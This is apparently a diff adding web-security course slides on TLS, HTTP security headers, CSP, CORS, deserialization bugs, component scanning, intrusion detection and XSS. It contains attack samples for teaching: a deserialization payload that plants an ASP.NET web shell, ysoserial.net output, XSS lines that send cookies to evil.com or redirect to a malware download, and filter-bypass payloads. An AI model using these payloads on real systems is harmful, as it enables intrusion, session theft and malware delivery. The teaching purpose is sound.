+<img src="net1.png" width="80%" class="ns c">
+---
+<img src="net2.png" width="90%" class="ns c">
+---
+<img src="net3.png" width="90%" class="ns c">
+---
+<img src="net4.png" width="90%" class="ns c">
+---
+# TLS conclusion
+
+- Use transport layer encryption such as TLS (Transport Layer Security)
+- Inspect your configuration for misconfigurations
+- Be sure to know where you terminate, and why
+- transport layer encryption must be applied to **all** pages/resources
+- Teach users that your site should **never** be accessed over plaintext HTTP
+	- Teach users what to look for
+---
+class: center, middle
+# Security Misconfiguration
+---
+class: center, middle
+### Lack of hardened configuration ≈ security misconfiguration
+---
+# Security Misconfiguration
+- Missing HTTP security headers
+- Missing cookie flags
+- Weak Cross-Origin Resource Sharing
+- Unnecessary features enabled (debug mode, etc)
+- Outdated components
+- Firewall running but without any rules
+- Default accounts with default credentials (admin/password, admin/admin, guest/guest ...)
+- Detailed error handling
+- Use of cryptography with weaker configuration than the strongest available
+
+---
+# HTTP Security Headers
+- HTTP Strict Transport Security
+- Public Key Pinning Extension for HTTP (HPKP)
+- X-Frame-Options
+- X-XSS-Protection
+- X-Content-Type-Options
+- Content-Security-Policy
+- Referrer-Policy
+---
+# X-Frame-Options
+
+Method for the server to tell the browser whether or not the page can be displayed inside a frame (e.g. iFrame)
+
+The header was created to protect against clickjacking aka "UI redress attack".
+
+Options:
+- `X-Frame-Options: deny`
+- `X-Frame-Options: sameorigin`
+- `X-Frame-Options: allow-from: <domain>`
+---
+# Clickjacking
+
+Same goal as CSRF: Performing action on behalf of a victim user
+
+Principle: you think you click on something on http://attacker.com, but instead you click on something on http://example.com
+---
+class: middle
+<img src="clickjacking.jpeg" width="100%" class="ns c">
+
+source: http://seclab.stanford.edu/websec/framebusting/framebust.pdf
+---
+class: middle, center
+<iframe width="560" height="315" src="https://www.youtube.com/embed/3mk0RySeNsU" frameborder="0" allowfullscreen></iframe>
+
+https://youtu.be/3mk0RySeNsU
+---
+class: middle, center
+### Solution: `X-Frame-Options: deny`
+---
+## `X-Content-Type-Options: nosniff`
+
+Prevents browser MIME sniffing, forcing browsers to interpret response as the statend content-type.
+
+```http
+HTTP/1.1 200 OK
+Content-Length: 108
+Content-Type: text/plain;
+X-Content-Type-Options: nosniff
+
+<html>
+<body bgcolor=”#AA0000″>
+Hello, world!
+</body>
+</html>
+```
+
+Requirements for exploitation:
+- User controllable response
+- No `X-Content-Type-Options: nosniff` header
+- Victim running browser which performs MIME sniffing
+
+---
+class: middle, center
+# Content Security Policy (CSP)
+
+### Whitelist content sources
+---
+# CSP "content"
+
+- scripts
+- stylesheets
+- fonts
+- media
+- images
+- forms
+- ...
+
+Documentation: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
+---
+# XSS hardening with CSP - Script whitelisting
+
+Typical website has alot of scripts from many different sources:
+- Inline script (`<script> ... </script>`)
+- External scripts (`<script src="script.js"></script>`)
+- analytics
+- CDN content
+- minified scripts
+- third party tools
+- plugins
+---
+# XSS hardening with CSP - Script whitelisting
+
+What is blocked/allowed?
+
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html;
+Content-Security-Policy: script-src https://example.com/
+
+<html>
+	1: <script>alert(1);</script>
+	2: <script src="https://example.com/strawberries.js"></script>
+	3: <script src="http://example.com/blueberries.js"></script>
+	4: <script src="https://google.com/hello.js"></script>
+</html>
+```
+---
+# XSS hardening with CSP - Script whitelisting
+
+What is blocked/allowed?
+
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html;
+Content-Security-Policy: script-src https://example.com/
+
+<html>
+	1: <script>alert(1);</script>
+	2: <script src="https://example.com/strawberries.js"></script>
+	3: <script src="http://example.com/blueberries.js"></script>
+	4: <script src="https://google.com/hello.js"></script>
+</html>
+```
+
+1. Blocked
+2. Allowed
+3. Blocked
+4. Blocked
+---
+# XSS hardening with CSP - Script whitelisting
+
+```html
+<?php
+header("Content-Security-Policy: script-src 'nonce-YOLO'");
+?>
+
+<script>alert("hello!");</script>
+
+<script nonce="YOLO">alert("hello from nonce!");</script>
+```
+---
+# XSS hardening with CSP - Script whitelisting
+
+```html
+<?php
+header("Content-Security-Policy: script-src 'nonce-YOLO'");
+
+echo $_GET['injectable'];
+?>
+
+<script>alert("hello!");</script>
+
+<script nonce="YOLO">alert("hello from nonce!");</script>
+```
+
+---
+# XSS hardening with CSP - Script whitelisting
+
+```html
+<?php
+header("Content-Security-Policy: script-src 'nonce-YOLO'");
+
+echo $_GET['injectable'];
+?>
+
+<script>alert("hello!");</script>
+
+<script nonce="YOLO">alert("hello from nonce!");</script>
+```
+`/a.php?injectable=<script+nonce%3d"YOLO">alert("XSS")%3b</script>`
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Security-Policy: script-src 'nonce-YOLO'
+Content-Length: 311
+Connection: close
+
+<script nonce="YOLO">alert("XSS");</script>
+
+<script>alert("hello!");</script>
+
+<script nonce="YOLO"> alert("hello from nonce!"); </script>
+ 
+```
+---
+# XSS hardening with CSP - Script whitelisting
+```html
+<?php
+$nonce = bin2hex(openssl_random_pseudo_bytes(14));
+
+header("Content-Security-Policy: script-src 'nonce-" . $nonce . "'");
+
+echo $_GET['injectable'];
+?>
+
+<script>alert("hello!");</script>
+
+<script nonce="<?php echo $nonce; ?>">alert("hello from nonce!");</script>
+```
+```http
+HTTP/1.1 200 OK
+Content-Security-Policy: script-src 'nonce-18c292a625d1a8f0ec712bc7ef00'
+Content-Length: 311
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<script nonce="YOLO">alert("XSS");</script>
+
+<script>alert("hello from inline!");</script>
+
+<script nonce="18c292a625d1a8f0ec712bc7ef00">alert("hello from nonce!");</script>
+ 
+```
+---
+# XSS hardening with CSP - Script whitelisting
+```http
+HTTP/1.1 200 OK
+Content-Security-Policy: script-src 'sha256-GAF48QOoxRvu0gZAmQivUdJPyBacqz
+	nBAXwnkfpmQX4='
+Content-Length: 77
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<script>alert('XSS');</script>
+<script>alert('test');</script>
+```
+```bash
+$ echo -n "alert('XSS');" | openssl dgst -sha256 -binary | base64
+73QCtja8McFjq8v/4GJw0UTKxydR5NoYiy8QQlN2TMA=
+$ echo -n "alert('test');" | openssl dgst -sha256 -binary | base64
+GAF48QOoxRvu0gZAmQivUdJPyBacqznBAXwnkfpmQX4=
+```
+---
+# CSP directives
+Non-exhaustive list:
+- base-uri
+- block-all-mixed-content
+- child-src
+- connect-src
+- default-src
+- font-src
+- form-action
+- report-uri
+- require-sri-for
+- sandbox
+- script-src
+- style-src
+- upgrade-insecure-requests
+- worker-src
+- ...
+
+documentation: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/
+---
+# CSP directives
+
+- [block-all-mixed-content](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/block-all-mixed-content): prevents loading any assets using HTTP when the page is loaded using HTTPS
+
+- [upgrade-insecure-requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/upgrade-insecure-requests): instructs browsers to treat all of a site's insecure URLs (those served over HTTP) as though they have been replaced with secure URLs (those served over HTTPS)
+
+The `upgrade-insecure-requests` directive is evaluated before `block-all-mixed-content` and If the former is set, the latter is effectively a no-op. It is recommended to set one directive or the other – not both.
+---
+class: center, middle
+# Referrer-Policy
+---
+# Referrer-Policy
+The `Referrer-Policy` header controls the `Referer` header (which was misspelled in the spec)
+- `Referrer-Policy: no-referrer`
+- `Referrer-Policy: no-referrer-when-downgrade`
+- `Referrer-Policy: origin`
+- `Referrer-Policy: origin-when-cross-origin`
+- `Referrer-Policy: same-origin`
+- `Referrer-Policy: strict-origin`
+- `Referrer-Policy: strict-origin-when-cross-origin`
+- `Referrer-Policy: unsafe-url`
+
+Use `no-referrer` if you are not using the referrer. If you are, use `same-origin`.
+
+documentation: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
+---
+# HTTP Security Headers Exercises
+
+1. Go to https://securityheaders.io/
+2. Browse some sites under "Hall of Fame"
+3. Look at their security headers and make sure that you understand what they do and how they work
+4. Scan your own sites
+---
+class: middle, center
+# HTTP Cookie flags
+---
+# HTTP Cookie flags
+
+```
+Set-Cookie: <name>=<value>[; <Max-Age>=<age>]
+[; expires=<date>][; domain=<domain_name>]
+[; path=<some_path>][; secure][; HttpOnly]
+
+```
+1. `secure` - prevents the browser from sending the cookie without HTTPS
+
+2. `HttpOnly` - cookie cannot be accessed at all by any client side scripts
+---
+class: middle, center
+# Cross-Origin Resource Sharing (CORS)
+---
+class: middle, center
+# Same Origin Policy
+---
+<img src="sop1.png" class="ns" width="70%">
+---
+<img src="sop2.png" class="ns" width="70%">
+---
+<img src="sop3.png" class="ns" width="70%">
+---
+<img src="sop4.png" class="ns" width="89%">
+---
+<img src="sop5.png" class="ns" width="89%">
+---
+class: middle, center
+# Same Origin Policy
+*"Under the policy, a web browser permits scripts contained in a first web page to access data in a second web page, but only if both web pages have the same origin."*
+
+*"An origin is defined as a combination of URI scheme, host name, and port number."*
+
+source: https://en.wikipedia.org/wiki/Same-origin_policy
+---
+# Same Origin Policy
+<img src="sop.png" class="c ns" width="110%">
+
+source: https://en.wikipedia.org/wiki/Same-origin_policy
+
+full spec: https://tools.ietf.org/html/rfc6454
+---
+# CORS
+```http
+Access-Control-Allow-Origin: http://evil.com
+Access-Control-Allow-Credentials: true
+Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header
+```
+```http
+Access-Control-Allow-Origin: *
+```
+documentation: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
+---
+class: middle, center
+# Object injection / deserialization bugs
+---
+# Object injection / deserialization bugs
+https://github.com/JamesNK/Newtonsoft.Json
+```csharp
+public class Account
+{
+    public string Email { get; set; }
+    public bool Active { get; set; }
+    public DateTime CreatedDate { get; set; }
+    public IList<string> Roles { get; set; }
+}
+```
+```csharp
+string json = @"{
+  'Email': 'james@example.com',
+  'Active': true,
+  'CreatedDate': '2013-01-20T00:00:00Z',
+  'Roles': [
+    'User',
+    'Admin'
+  ]
+}";
+
+Account account = JsonConvert.DeserializeObject<Account>(json);
+Console.WriteLine(account.Email);
+// james@example.com
+```
+source: https://www.newtonsoft.com/json/help/html/DeserializeObject.htm
+---
+# Object injection / deserialization bugs
+```csharp
+public class Account
+{
+    public string Email { get; set; }
+	public string emailBackupFile { get; set; }
+
+	~Account()
+	{
+		using (System.IO.StreamWriter file = 
+            new System.IO.StreamWriter(emailBackupFile, true))
+        {
+            file.WriteLine(Email);
+        }
+	}
+}
+```
+---
+<img src="finalizers.png" class="c ns" width="100%">
+###### source: https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/classes-and-structs/destructors
+---
+# Object injection / deserialization bugs
+```csharp
+public class Account
+{
+    public string Email { get; set; }
+	public string emailBackupFile { get; set; }
+
+	~Account()
+	{
+		using (System.IO.StreamWriter file = 
+            new System.IO.StreamWriter(emailBackupFile, true))
+        {
+            file.WriteLine(Email);
+        }
+	}
+}
+```
+```csharp
+string json = @"{
+  'Email': '<%\r\nSystem.Diagnostics.Process.Start(new System.Diagnostics
+	.ProcessStartInfo(\"cmd\", Request[\"x\"]));\r\n%>',
+  'emailBackupFile': 'c:\inetpub\wwwroot\shell.aspx'
+}";
+
+Account account = JsonConvert.DeserializeObject<Account>(json);
+```
+---
+# Tools
+
+
+```
+Usage: ysoserial.exe [options]
+Options:
+  -o, --output=VALUE         the output format (raw|base64).
+  -g, --gadget=VALUE         the gadget chain.
+  -f, --formatter=VALUE      the formatter.
+  -c, --command=VALUE        the command to be executed.
+  -t, --test                 whether to run payload locally. Default: false
+  -h, --help                 show this message and exit
+
+$ ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
+{
+    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
+    'MethodName':'Start',
+    'MethodParameters':{
+        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+        '$values':['cmd','/ccalc']
+    },
+    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
+}
+
+$ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
+AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLCBWZXJzaW9uPTMuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUBAAAAJVN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNPYmplY3QBAAAABkNsaVhtbAECAAAABgMAAACJFQ0KPE9ianMgVmVyc2lvbj0iMS4xLjAuMSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vcG93ZXJzaGVsbC8yMDA0LzA0Ij4mI3hEOw0KPE9iaiBSZWZJZD0iMCI+JiN4RDsNCiAgICA8VE4gUmVmSWQ9IjAiPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZSNTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uL1J1bnNwYWNlSW52b2tlNTwvVD4mI3hEOw0KICAgICAgPFQ+TWljcm9zb2Z0Lk1hbmFnZW1lbnQuSW5mcmFzdHJ1Y3R1cmUuQ2ltSW5zdGFuY2UjUnVuc3BhY2VJbnZva2U1PC9UPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZTwvVD4mI3hEOw0KICAgICAgPFQ+U3lzdGVtLk9iamVjdDwvVD4mI3hEOw0KICAgIDwvVE4+JiN4RDsNCiAgICA8VG9TdHJpbmc+UnVuc3BhY2VJbnZva2U1PC9Ub1N0cmluZz4mI3hEOw0KICAgIDxPYmogUmVmSWQ9IjEiPiYjeEQ7DQogICAgICA8VE5SZWYgUmVmSWQ9IjAiIC8+JiN4RDsNCiAgICAgIDxUb1N0cmluZz5SdW5zcGFjZUludm9rZTU8L1RvU3RyaW5nPiYjeEQ7DQogICAgICA8UHJvcHM+JiN4RDsNCiAgICAgICAgPE5pbCBOPSJQU0NvbXB1dGVyTmFtZSIgLz4mI3hEOw0KCQk8T2JqIE49InRlc3QxIiBSZWZJZCA9IjIwIiA+ICYjeEQ7DQogICAgICAgICAgPFROIFJlZklkPSIxIiA+ICYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uV2luZG93cy5NYXJrdXAuWGFtbFJlYWRlcltdLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1PC9UPiYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uQXJyYXk8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPFMgTj0iSGFzaCIgPiAgDQoJCSZsdDtSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSImZ3Q7DQoJICZsdDtPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IkxhdW5jaENhbGMiIE9iamVjdFR5cGUgPSAieyB4OlR5cGUgRGlhZzpQcm9jZXNzfSIgTWV0aG9kTmFtZSA9ICJTdGFydCIgJmd0Ow0KICAgICAmbHQ7T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnMmZ3Q7DQogICAgICAgICZsdDtTeXN0ZW06U3RyaW5nJmd0O2NtZCZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgICAgJmx0O1N5c3RlbTpTdHJpbmcmZ3Q7L2MgImNhbGMiICZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgJmx0Oy9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycyZndDsNCiAgICAmbHQ7L09iamVjdERhdGFQcm92aWRlciZndDsNCiZsdDsvUmVzb3VyY2VEaWN0aW9uYXJ5Jmd0Ow0KCQkJPC9TPiYjeEQ7DQogICAgICAgICAgPC9MU1Q+JiN4RDsNCiAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgIDwvUHJvcHM+JiN4RDsNCiAgICAgIDxNUz4mI3hEOw0KICAgICAgICA8T2JqIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIj4gJiN4RDsNCiAgICAgICAgICA8VE4gUmVmSWQ9IjEiID4gJiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3Q8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPE9iaiBSZWZJZD0iMyI+ICYjeEQ7DQogICAgICAgICAgICAgIDxNUz4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49IkNsYXNzTmFtZSI+UnVuc3BhY2VJbnZva2U1PC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPFMgTj0iTmFtZXNwYWNlIj5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uPC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPE5pbCBOPSJTZXJ2ZXJOYW1lIiAvPiYjeEQ7DQogICAgICAgICAgICAgICAgPEkzMiBOPSJIYXNoIj40NjA5MjkxOTI8L0kzMj4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49Ik1pWG1sIj4gJmx0O0NMQVNTIE5BTUU9IlJ1bnNwYWNlSW52b2tlNSIgJmd0OyZsdDtQUk9QRVJUWSBOQU1FPSJ0ZXN0MSIgVFlQRSA9InN0cmluZyIgJmd0OyZsdDsvUFJPUEVSVFkmZ3Q7Jmx0Oy9DTEFTUyZndDs8L1M+JiN4RDsNCiAgICAgICAgICAgICAgPC9NUz4mI3hEOw0KICAgICAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgICAgICA8L0xTVD4mI3hEOw0KICAgICAgICA8L09iaj4mI3hEOw0KICAgICAgPC9NUz4mI3hEOw0KICAgIDwvT2JqPiYjeEQ7DQogICAgPE1TPiYjeEQ7DQogICAgICA8UmVmIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIiAvPiYjeEQ7DQogICAgPC9NUz4mI3hEOw0KICA8L09iaj4mI3hEOw0KPC9PYmpzPgs=
+
+```
+https://github.com/pwntester/ysoserial.net
+---
+# Object Injection References
+
+- presentation: https://twitter.com/pwntester/status/917152966368473093
+- whitepaper: https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf
+- PHP object injection: https://www.owasp.org/index.php/PHP_Object_Injection
+- Java object injection: http://frohoff.github.io/owaspsd-deserialize-my-shorts/
+- Java object injection tool: https://github.com/frohoff/ysoserial
+---
+class: middle, center
+# Third party components
+---
+<img class="c" src="cvedetails.png" width="105%">
+---
+<img class="c" src="androidlist.png" width="70%">
+---
+# Android usage statistics
+September, 2017
+
+<img src="android-usage-september-2017.png" width="70%">
+
+source: https://fossbytes.com/most-popular-android-versions-always-updated/
+---
+<img src="android6.0vulns.png" width="120%">
+---
+<img src="springlist.png" width="90%">
+---
+<img src="spring3.0.2.png" width="140%">
+---
+<img src="cve-2010-1622.png" width="85%">
+---
+<img src="springexploit.png" width="85%">
+---
+# Tools
+Example whitebox vulnerability scanners / static code analysers:
+- OWASP Dependency-Check https://www.owasp.org/index.php/OWASP_Dependency_Check 
+- Retire.js https://retirejs.github.io/
+
+Example blackbox vulnerability scanners:
+
+- Nessus
+- WPScan
+
+---
+# Nessus
+<img src="nessus.png" width="100%">
+sample reports: https://www.tenable.com/products/nessus/sample-reports
+---
+<img src="wpscan.png" width="150%">
+---
+# Exercises
+
+1. Find software projects
+	- if online, go to e.g. GitHub
+		- search for e.g. "CMS"/"gallery"/"blog"
+	- if offline, go to `~/examples/`
+2. Scan it with `Dependency-Check` (use `-n` or `--noupdate`)
+3. Scan it with `retire`
+4. Search for known vulnerabilitites in third party components in your own projects
+5. Run `searchsploit <searchstring>` from your terminal and see if you can find exploits
+---
+# Conclusion
+- Third party components should be checked for vulnerabilities:
+	- when integreted
+	- regularly
+
+- Choose components where the authors have a proven track record of fixing discovered vulnerabilities
+
+- Static code analysers (SCA) such as `Dependency-Check` and `retire` should be integrated in build scripts, and should fail the build if vulnerabilities are found
+
+	- or make buildserver run SCA regularly - and make sure that the tool's database is updated automatically!
+---
+class: middle, center
+# Insufficient Attack Protection
+---
+# Insufficient Attack Protection
+- Prevent
+- Detect
+- React
+---
+### Hacking (especially automatic tools) produce noise
+<img src="sqlmap.png" width="90%" class="c">
+---
+## Even "stupid" rules would detect some things
+
+- No more than 1 request every 5 seconds per IP-address
+- No URLs longer than 200 characters
+- URLs cannot include SQL keywords
+- URLs cannot include JavaScript keywords
+- URLs cannot include vbscript keywords
+- URLs cannot include "../"
+- etc
+---
+## More complex solutions
+
+- Web Application Firewall
+	- ModSecurity (https://modsecurity.org/)
+		- OWASP ModSecurity Core Ruleset (https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project)
+- Intrusion Detection/Prevention System (IDS/IPS)
+	- Suricata (https://suricata-ids.org/)
+	- Snort (https://www.snort.org/)
+- Artificial Intelligence
+	- Nameles - Invalid Traffic Detection (http://nameles.org/)
+---
+## Patch Management
+
+- Who checks open source libraries for security updates?
+- How often?
+- Which security updates are important?
+- What do you do when you are unsure/don't know?
+- What is the procedure for updating?
+- How fast do you need to update?
+- Which systems do you update first?
+---
+## Logs
+
+- Do you log?
+- Do you log enough?
+- Do you log too much?
+- How often are logs inspected?
+- Who inspects logs?
+- What do you look for?
+- What do you do when you find items of interest?
+	- What do you do when you are unsure?
+- How long do you keep logs?
+- Where do you keep them?
+	- remote backup - what happens then the connection is down?
+		- how long do you keep remote backups?
+---
+#### Monitoring
+<img src="kibana.png" width="120%" class="c" style="margin-left:-10%;">
+
+source: https://i1.wp.com/www.thistechnologylife.com/wp-content/uploads/2014/08/kibana.png
+---
+## Monitoring of security events
+
+Examples:
+
+- Web application functionalty events
+	- account creations
+	- user logins
+	- ...
+- New OS accounts
+- New files on disk
+- Amount of File changes
+- Amount of disk entropy changes
+- Amount of traffic per IP-address
+- Abnormal amount of Tor traffic
+- Abnormal amount of traffic from specific country
+- ...
+
+
+The application must provide metrics for effective security monitoring!
+
+`/ok` is not enough!
+
+
+---
+class: middle, center
+## If/when you suspect an intrusion
+---
+class: middle
+## If/when you suspect an intrusion
+
+1. Do ***not*** power off the infected systems - disconnect them from the network
+	- Vital information may reside in memory
+		- malware samples
+		- IP-addresses of interest
+		- encryption keys of ransomware
+
+2. Hire Incident Responders and Forensics specialists
+---
+class: center, middle
+# XSS
+Cross-site scripting
+---
+# Goal
+Inject bad stuff in user's browsers
+---
+# For fun
+```html
+<h1>MOHAHAHAH YOU HAVE BEEN HACKED!!!</h1>
+```
+<img src="mohaha.png" width="100%">
+---
+# To get money
+```html
+<h1>We have stolen all your stuff! Send a ton of $$$$</h1>
+```
+<img src="steal.png" width="100%">
+---
+# To spread malware
+```html
+<script>window.location = "http://evil.com/prophecy.zip";</script>
+```
+<img src="download.png" width="50%" class="c">
+---
+# What does this do? and why?
+```html
+<script>
+a = '<img src="http://evil.com/collect.gif?x=' + escape(document.cookie) + '" />';
+document.write(a);
+</script>
+```
+---
+# Attacker's apache access_log
+
+```log
+71.8.51.256 - - [07/Feb/2013:20:41:17 +0700] "GET /collect.gif?x=I_MaWpDC7126YmBO52ZSh1A
+sd--KmqQ%3b+__qca%3dP0-729728865-1504205877976%3b+_ga%3dGA1.2.1238627493.1504205878%3b+_
+gid%3dGA1.2.689 323835.1504205878 HTTP/1.1" 200 285 "http://evil.com/collect.gif?x=__gad
+s%3dID%3d75b533976fe567ab%3aT%3d1504205885%3aS%3dALNI_MaWpDC7126YmBO52ZSh1Asd--KmqQ%3b+_
+_qca%3dP0-729728865-1504205877976%3b+_ga%3dGA1.2.1238627493.1504205878%3b+_gid%3dGA1.2.6
+89323835.1504205878" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.17 (KHTML, like Gecko
+) Chrome/24.0.1312.57 Safari/537.17"
+```
+---
+# Terminology
+XSS payload == thing the attacker wants to inject into your browser
+---
+# Types of XSS
+1. Reflected
+2. Stored (persistent)
+3. DOM-based
+---
+class: center, middle
+# Reflected XSS
+---
+# Reflected XSS
+XSS payload is sent to the server, which returns it back in it's response.
+
+After that, it's gone.
+
+
+<img class="ns" src="reflected.png" width="100%">
+---
+# Reflected XSS
+
+Example:
+```
+http://example.com/search=<script>alert("xss");</script>
+```
+HTTP request:
+```http
+GET /search=<script>alert("xss");</script> HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+```
+HTTP response:
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 1270
+Connection: close
+
+<!doctype html>
+<html>
+...
+Your search for "<script>alert("xss");</script>" gave 0 results.
+```
+---
+class: center, middle
+# Stored XSS (persistent XSS)
+---
+# Stored XSS (persistent XSS)
+Two step attack:
+
+1. XSS payload is sent to the server, which stores it.
+2. Victim user visits website, which serves the payload to the victim
+
+Note: XSS payload is stored, potentially forever, in some form of database.
+
+<img class="ns" src="stored.png" width="100%">
+---
+# Stored XSS (persistent XSS)
+Step 1: inject payload on http://example.com/addYourName.php
+
+<img src="postxss.png">
+```http
+POST /addYourName.php HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+...
+fname=Kevin%3Cscript%3Ealert%28%22xss%22%29%3B%3C%2Fscript%3E&lname=
+```
+Step 2: on http://example.com/ViewAllNames.php
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html
+...
+<p>Names of visitors:</p>
+<ul>
+  <li>Robert</li>
+  <li>John</li>
+  <li>Kevin<script>alert("xss");</script><li>
+</ul>
+```
+---
+class: middle, center
+# XSS mitigation
+XSS prevention
+---
+class: middle, center
+# Why not just remove "&lt;" and "&gt;"?
+a.k.a. filtering
+---
+class: middle, center
+# Let's try !
+---
+# XSS mitigation
+Assume that "&lt;" and "&gt;" are blacklisted:
+
+```html
+<?php
+$input = $_GET["name"];
+$input = str_replace("<", "", $input);
+$input = str_replace(">", "", $input);
+?>
+<input type="text" value="<?php echo $input; ?>">
+```
+
+payload: `&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x22;&#x78;&#x73;&#x73;&#x22;&#x29;&#x3b;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;` will become:
+
+```html
+<input type="text" value="scriptalert("xss");/script")>
+```
+Is it possible to get around this filter?
+---
+# Simple XSS filter bypass
+Payload: 
+```
+" onmouseover="alert('xss')" x="
+```
+Result:
+```html
+<input type="text" value="" onmouseover="alert('xss')" x="">
+```
+---
+# UTF-7 charset XSS filter bypass
+Only worked if site didn't declare charset, or declared charset as utf-7:
+```html
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>
+```
+XSS payload:
+```html
++ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+```
+source: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+---
+# VBScript XSS filter bypass
+XSS payload
+```html
+<IMG SRC='vbscript:msgbox("XSS")'>
+```
+source: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+---
+# Regular expression XSS filter bypass
